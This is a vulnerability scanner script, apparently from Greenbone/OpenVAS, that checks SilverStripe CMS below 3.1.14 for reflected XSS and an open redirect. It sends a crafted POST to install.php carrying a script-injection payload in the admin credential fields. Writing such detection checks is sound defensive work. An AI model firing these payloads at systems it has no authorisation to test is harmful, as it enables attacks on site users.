# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:silverstripe:silverstripe";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805592");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2015-5063", "CVE-2015-5062");
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2015-06-22 12:00:20 +0530 (Mon, 22 Jun 2015)");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("SilverStripe CMS < 3.1.14 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_silverstripe_cms_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("silverstripe_cms/http/detected");

  script_tag(name:"summary", value:"SilverStripe CMS is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Multiple flaws exist due to:

  - insufficient validation of input passed via 'admin_username' and 'admin_password' POST parameter
  to the install.php script

  - the application not validating the 'returnURL' GET parameter upon submission to the /dev/build
  script");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to create a
  specially crafted URL, that if clicked, would redirect a victim from the intended legitimate web
  site to an arbitrary web site of the attacker's choosing, and execute arbitrary HTML and script
  code in the context of an affected site.");

  script_tag(name:"affected", value:"SilverStripe CMS version 3.1.13 and probably prior.");

  script_tag(name:"solution", value:"Update to version 3.1.14 or later.");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2015/Jun/44");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/132223");
  script_xref(name:"URL", value:"http://hyp3rlinx.altervista.org/advisories/AS-SILVERSTRIPE0607.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/install.php";
data = 'admin[username]="><script>alert(document.cookie)</script>&admin[password]="><script>alert(document.cookie)</script>';

host = http_host_name(port:port);

req = string('POST ', url, ' HTTP/1.1\r\n',
             'Host: ', host, '\r\n',
             'Accept-Encoding: gzip,deflate\r\n',
             'Content-Type: application/x-www-form-urlencoded\r\n',
             'Content-Length: ', strlen(data), '\r\n\r\n',
             data);
res = http_keepalive_send_recv(port:port, data:req);

if(res && res =~ "^HTTP/1\.[01] 200" && "><script>alert(document.cookie)</script>" >< res && "<title>SilverStripe CMS" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
